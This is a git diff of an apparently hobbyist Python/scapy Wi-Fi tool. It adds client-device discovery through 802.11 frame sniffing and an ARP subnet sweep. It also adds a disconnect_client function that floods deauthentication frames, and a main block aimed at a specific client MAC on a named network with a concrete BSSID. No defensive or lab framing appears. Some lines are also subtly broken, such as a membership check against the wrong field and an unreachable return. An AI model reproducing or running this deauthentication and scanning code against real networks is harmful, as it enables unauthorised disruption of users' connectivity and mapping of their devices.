@@ -12,21 +12,17 @@ from scapy.all import *  # noqa: E402
 
 
 class Network:
-    def __init__(self, ssid: str, bssid: str, channel: int, crypto: set[str]):
+    def __init__(self, ssid: str, bssid: str, channel: int, crypto: set[str], gateway: str = None, subnet: int = None):
         self.ssid = ssid
         self.bssid = bssid
         self.channel = channel
         self.crypto = crypto
-        self.subnet = None
-        self.gateway = None
+        self.gateway = gateway
+        self.subnet = subnet
 
     def __str__(self):
-        return '[Network info] ssid:{}  bssid:{}  channel:{}  crypto:{}  subnet:{}  gateway:{}'.format(self.ssid,
-                                                                                                       self.bssid,
-                                                                                                       self.channel,
-                                                                                                       self.crypto,
-                                                                                                       self.subnet,
-                                                                                                       self.gateway)
+        return ('[Network info] ssid:{}  bssid:{}  channel:{}  crypto:{}  gateway:{}  subnet:{}'
+                .format(self.ssid, self.bssid, self.channel, self.crypto, self.gateway, self.subnet))
 
 
 class Host:
@@ -35,15 +31,15 @@ class Host:
         self.MAC = MAC
         self.IP = IP
 
+    def __str__(self):
+        return ('[Host info] bssid:{}  MAC:{}  IP:{}'
+                .format(self.bssid, self.MAC, self.IP))
+
 
 # Recognizes and returns a list of network interface.
 #   [Input] none
 #   [Output] List of available network interface [Name, Description, MAC, IPv4]
-## Test Requirements:
-##  - 네트워크 인터페이스 정보를 명확하게 불러오는지
-##  - Windows 기반으로만 작동 확인했으므로 Linux에서 정상 동작하는지
-##  -- 사용 안 하는(DOWN 상태인) 인터페이스를 표시하지 않아야 함
-def lookup_iface():
+def lookup_iface() -> list[NetworkInterface]:
     iface_list = []
     for guid, iface in conf.ifaces.data.items():
         if iface.mac != '':  # Windows에서 WAN Miniport 제외
@@ -51,35 +47,18 @@ def lookup_iface():
     return iface_list
 
 
-def kawi_sniff():
-    ap_list = []
-
-    # Callback function that executes with each packet sniffed.
-    #   [Input] a packet
-    #   [Output] none
-    def packet_handler(packet):
-        # if u want to print summary information of the packet: print(packet.summary())
-        # todo:
-        #  - 주변 AP 및 Client MAC 주소 불러오기. 어떨게?
-        #      1. Management Frame(Beacon Frame, Probe Request/Response 등)
-        if packet.type == 0 and packet.subtype == 8:
-            if packet.addr2 not in ap_list:
-                ap_list.append(packet.addr2)
-                print("AP MAC: %s with SSID: %s " % (packet.addr2, packet.info))
-
-    iface_list = lookup_iface()
-    # select one, set to conf.iface
-    # ...
-    conf.iface = next((i for i in iface_list if i.description == '802.11n USB Wireless LAN Card'), None)
-    if conf.iface is None:
-        logging.error("Network interface is not recognized: 802.11n USB Wireless LAN Card")
-        return
-    # can choose whether to sniff in monitor mode or not.
-    monitor = True
-    # params for sniff(): scapy/scapy/sendrecv.py - class AsyncSniffer - def _run(...) 참고.
-    # iface 명시하지 않으면 자동으로 conf.iface의 인터페이스가 선택됨
-    conf.iface.setmonitor(False)
-    sniff(prn=packet_handler, monitor=monitor)
+# Send de-authentication frame to force disconnect a specific client or all clients connected to the target network
+#   [Input] Network, Target Client MAC address, Broadcast or not, Network interface to use
+#   [Output] None
+def disconnect_client(network: Network, client_MAC: str = '', broadcast: bool = False, iface=conf.iface):
+    if broadcast:
+        client_MAC = 'ff:ff:ff:ff:ff:ff'
+    deauth_packet = (RadioTap()
+                     / Dot11(type=0, subtype=12, addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
+                     / Dot11Deauth(reason=7))
+    iface.setmonitor(True)
+    sendp(deauth_packet, iface=iface, monitor=True, count=100, inter=0.1)
+    iface.setmonitor(False)
 
 
 # Change the channel of the target network interface. (Only works in monitor mode.)
@@ -149,24 +128,33 @@ def scan_AP(channels: list[int] = None, frequency: str = None, active: bool = Fa
     return network_list
 
 
-# Scan the MAC addresses of host devices from probe requests
-def scan_host_MAC(network: Network, iface=conf.iface) -> list[dict]:
-    host_MAC_list = []
+# Scan client devices connected to a specific network.
+#   [Input] Target network, Network interface to use
+#   [Output] Information list of client devices ( )
+def scan_host(network: Network, iface=conf.iface) -> list[Host]:
+    host_list = _scan_host_MAC(network, iface)
+    host_list = _scan_host_IP(host_list, network, iface)
+    return host_list
+
+
+# Scan MAC addresses of client devices
+def _scan_host_MAC(network: Network, iface=conf.iface) -> list[dict]:
+    host_list = []
 
     # Callback function that executes with each packet sniffed.
     def handle_scan_host_MAC(packet):
         try:
             if packet.haslayer(Dot11):
-                if (packet.type == 0 and packet.subtype == 4    # Probe Request Frame (Occurs only on new connection)
+                if (packet.type == 0 and packet.subtype == 4  # Probe Request Frame (Occurs only on new connection)
                         and packet.addr3 == network.bssid):
-                    if packet.addr2 not in host_MAC_list:
-                        host_MAC_list.append(packet.addr2)
-                        print(host_MAC_list[-1])
+                    if packet.addr2 not in [host.bssid for host in host_list]:
+                        host_list.append(Host(network.bssid, packet.addr2, ''))
+                        print(host_list[-1])
                 elif (packet.type == 2  # Data Frame
-                        and packet.addr1 == network.bssid): # Client -> AP (To DS=1, From DS=0)
-                    if packet.addr2 not in host_MAC_list:
-                        host_MAC_list.append(packet.addr2)
-                        print(host_MAC_list[-1])
+                      and packet.addr1 == network.bssid):  # Client -> AP (To DS=1, From DS=0)
+                    if packet.addr2 not in [host.bssid for host in host_list]:
+                        host_list.append(Host(network.bssid, packet.addr2, ''))
+                        print(host_list[-1])
         except (KeyError, TypeError) as e:  # Probably a malformed packet
             ...
 
@@ -174,21 +162,43 @@ def scan_host_MAC(network: Network, iface=conf.iface) -> list[dict]:
     switch_channel(network.channel, iface)
     sniff(iface=iface, monitor=True, timeout=10, prn=handle_scan_host_MAC, store=0)
     iface.setmonitor(False)
-    return host_MAC_list
+    return host_list
 
 
-# Scan client devices connected to a specific network.
-#   [Input] Target network, Network interface to use
-#   [Output] Information list of client devices ( )
-def scan_host(network: Network, iface=conf.iface) -> list[Host]:
-    client_list = []
-    client_mac_list = scan_host_MAC(network, iface)
+# Scan IP addresses of client devices
+def _scan_host_IP(host_list: list[Host], network: Network, iface=conf.iface) -> list[dict]:
+    _find_MAC_from_IP(host_list, network, iface)
 
-    return client_list
+    return host_list
+
+
+# SScan IP with ARP Request/Response within subnet range
+def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=conf.iface):
+    gateway = network.gateway if network.gateway is not None else '192.168.0.1'
+    subnet = network.subnet if network.subnet is not None else 24
+    ARP_request = (Ether(dst='ff:ff:ff:ff:ff:ff', src=iface.mac, type='ARP')
+                   / ARP(hwsrc=iface.mac, psrc=iface.ip, pdst='{}/{}'.format(gateway, subnet))[0])
+    answered_list = srp(ARP_request, iface=iface, timeout=10)[0]
+    for sent, received in answered_list:  # ARP Response
+        appended = False
+        for host in host_list:
+            if received.hwsrc == host.MAC:
+                host.IP = received.psrc
+                appended = True
+        if not appended:
+            host_list.append(Host(network.bssid, received.hwsrc, received.psrc))
+
+        print('{} - {}'.format(received.hwsrc, received.psrc))
+    return host_list
+
+    return None
 
 
 if __name__ == '__main__':
     iface_list = lookup_iface()
     iface = next((i for i in iface_list if i.description == '802.11n USB Wireless LAN Card'), None)
+    network = Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}, '192.168.0.1', 24)
     # scan_AP(frequency='2.4ghz', iface=iface)
-    scan_host(network=Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}), iface=iface)
+    # scan_host(network=Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}), iface=iface)
+    # _find_MAC_from_IP([], network=, iface=iface)
+    disconnect_client(network, client_MAC='02:75:38:b4:89:38', iface=iface)
